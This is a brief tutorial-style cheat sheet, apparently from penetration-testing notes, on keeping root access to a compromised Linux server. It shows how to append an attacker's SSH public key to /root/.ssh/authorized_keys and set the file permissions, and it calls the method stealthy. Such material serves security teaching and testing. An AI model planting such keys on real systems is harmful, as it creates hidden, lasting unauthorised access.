SSH Public Key Installation

Gaining passwordless access via SSH.

How it Works

  • Generate an SSH key pair on your attacker machine.
  • Copy your public key to the target's privileged user's ~/.ssh/authorized_keys file.
  • Ensure correct file permissions for the .ssh directory and authorized_keys file.
  • Log in directly via SSH without a password using your private key.

Example Scenario

After gaining root access on a Linux server, you add your public SSH key to /root/.ssh/authorized_keys. Now, you can SSH into the server as root anytime, even after reboots, without needing the root password.

Key Takeaway

SSH key persistence offers a highly reliable and often stealthy way to maintain access on Linux systems, bypassing password authentication.

Attacker Machine (Kali)
# Generate SSH key pair (if you don't have one)
ssh-keygen -t rsa -b 4096

# Display public key to copy
cat ~/.ssh/id_rsa.pub
Target Machine (Linux)
# Create .ssh directory if it doesn't exist
mkdir -p /root/.ssh

# Append attacker's public key to authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> /root/.ssh/authorized_keys

# Set correct permissions
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
